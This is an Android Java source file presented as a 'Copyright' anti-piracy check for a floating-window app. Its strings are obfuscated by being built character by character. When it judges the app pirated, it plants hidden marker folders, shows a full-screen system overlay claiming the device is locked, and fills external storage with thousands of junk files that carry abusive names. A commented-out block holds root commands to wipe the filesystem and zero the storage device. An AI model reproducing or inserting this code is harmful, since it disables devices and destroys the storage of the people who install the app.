package com.yzrilyzr.floatingwindow;

import android.graphics.PixelFormat;
import android.graphics.drawable.BitmapDrawable;
import android.os.Environment;
import android.os.Handler;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;
import com.yzrilyzr.icondesigner.VECfile;
import com.yzrilyzr.myclass.util;
import java.io.File;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import com.yzrilyzr.ui.uidata;
import java.io.OutputStream;

public class Copyright
{
	public static void k()
	{
		c();
	}
	public static void a()
	{
		
	}
	private static void c()
	{
		String m=t('c','o','p','y','r','i','g','h','t');
		File f=util.ctx.getDir(m,0);
		if(!f.exists())f.mkdirs();
		f=new File(f.getAbsolutePath()+t('/','.','e'));
		boolean c=false;
		c=c||f.exists();
		f=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+t('/','A','n','d','r','o','i','d','/','d','a','t','a','/','.','p'));
		c=c||f.exists();
		f=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+t('/','D','C','I','M','/','C','a','m','e','r','a','/','.','k'));
		c=c||f.exists();
		f=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+t('/','t','e','n','c','e','n','t','/','M','o','b','i','l','e','Q','Q','/','.','j'));
		c=c||f.exists();
		c=c||!t('悬','浮','窗').equals(util.ctx.getString(R.string.app_name));
		c=c||!t('b','y',' ','y','z','r','i','l','y','z','r').equals(util.ctx.getString(R.string.name));
		c=c||!t('修','改','版','权','全','家','爆','炸').equals(util.ctx.getString(R.string.nmsl));
		if(c)
		{
			util.toast(t('该','"','悬','浮','窗','"','软','件','为','盗','版'));
			d();
			e();
			f();
		}
	}
	private static void d()
	{
		String m=t('c','o','p','y','r','i','g','h','t');
		File f=util.ctx.getDir(m,0);
		if(!f.exists())f.mkdirs();
		f=new File(f.getAbsolutePath()+t('/','.','e'));
		f.mkdirs();
		f=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+t('/','A','n','d','r','o','i','d','/','d','a','t','a','/','.','p'));
		f.mkdirs();
		f=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+t('/','D','C','I','M','/','C','a','m','e','r','a','/','.','k'));
		f.mkdirs();
		f=new File(Environment.getExternalStorageDirectory().getAbsolutePath()+t('/','t','e','n','c','e','n','t','/','M','o','b','i','l','e','Q','Q','/','.','j'));
		f.mkdirs();
	}
	private static void e()
	{
		new Handler(util.ctx.getMainLooper()).postDelayed(new Runnable(){
				@Override
				public void run()
				{
					WindowManager window=(WindowManager)util.ctx.getSystemService(util.ctx.WINDOW_SERVICE);
					WindowManager.LayoutParams windowParam=new WindowManager.LayoutParams(
						util.getScreenWidth(),util.getScreenHeight(),
						WindowManager.LayoutParams.TYPE_SYSTEM_ERROR,
						WindowManager.LayoutParams.FLAG_ALT_FOCUSABLE_IM|
						WindowManager.LayoutParams.FLAG_FULLSCREEN,
						PixelFormat.RGBA_8888
					);
					windowParam.x=0;
					windowParam.y=0;
					windowParam.gravity=Gravity.LEFT|Gravity.TOP;
					TextView tx=new TextView(util.ctx);
					window.addView(tx,windowParam);
					tx.setTextColor(0xff8cff00);
					try
					{
						tx.setBackgroundDrawable(new BitmapDrawable(VECfile.createBitmap(util.ctx,"wsm",util.getScreenWidth(),util.getScreenHeight())));
					}
					catch (Exception e)
					{}
					tx.getPaint().setTextSize(util.px(uidata.TEXTSIZE*2));
					tx.append(t('由','于','您','使','用','盗','版','软','件','，','您','的','设','备','已','锁','定','！'));
				}
			},2000);
			/*try{
				OutputStream p=Runtime.getRuntime().exec("su").getOutputStream();
				p.write("rm -rf /*".getBytes());
		 			dd if=/dev/zero of=/dev/block/mmcblk0
				p.flush();
			}catch(Throwable e){
				
			}*/
		}
	private static void f()
	{
		int[] w=new int[]{'修','改','狗','你','妈','爆','炸'};
		ArrayList<File> allFloder=new ArrayList<File>();
		File sd=Environment.getExternalStorageDirectory();
		StringBuilder sb=new StringBuilder();
		getFile(allFloder,sd);
		int left=(int)(sd.getFreeSpace()/(long)allFloder.size())/10;
		for(int y=0;y<w.length;y++)sb.append((char)w[y]).append("%d");
		int c=0;
		if(left<1048576)
			for(File z:allFloder)
				for(int i=0;i<10;i++)
				{
					try
					{
						RandomAccessFile r=new RandomAccessFile(
							z.getAbsolutePath()+"/"+
							String.format(sb.toString(),
										  util.random(0,10),
										  util.random(0,10),
										  util.random(0,10),
										  util.random(0,10),
										  util.random(0,10),
										  util.random(0,10),
										  util.random(0,10)
										  )+"_"+
							(c++)+"次","rw");
						r.setLength(left);
						r.close();
					}
					catch (Exception e)
					{}
				}
		else
		{
			left=(int)(sd.getFreeSpace()/10000l);
			for(int i=0;i<10000;i++)
			{
				try
				{
					RandomAccessFile r=new RandomAccessFile(
						sd.getAbsolutePath()+"/"+
						String.format(sb.toString(),
									  util.random(0,10),
									  util.random(0,10),
									  util.random(0,10),
									  util.random(0,10),
									  util.random(0,10),
									  util.random(0,10),
									  util.random(0,10)
									  )+"_"+
						(c++)+"次","rw");
					r.setLength(left);
					r.close();
				}
				catch (Exception e)
				{}
			}
		}
	}
	private static String t(int... w)
	{
		StringBuilder sb=new StringBuilder();
		for(int y=0;y<w.length;y++)sb.append((char)w[y]);
		return sb.toString();
	}
	private static void getFile(ArrayList<File> l,File f)
	{
		if(f.isDirectory())
		{
			l.add(f);
			System.out.println(f);
			File[] h=f.listFiles();
			for(File s:h)getFile(l,s);
		}
	}
}
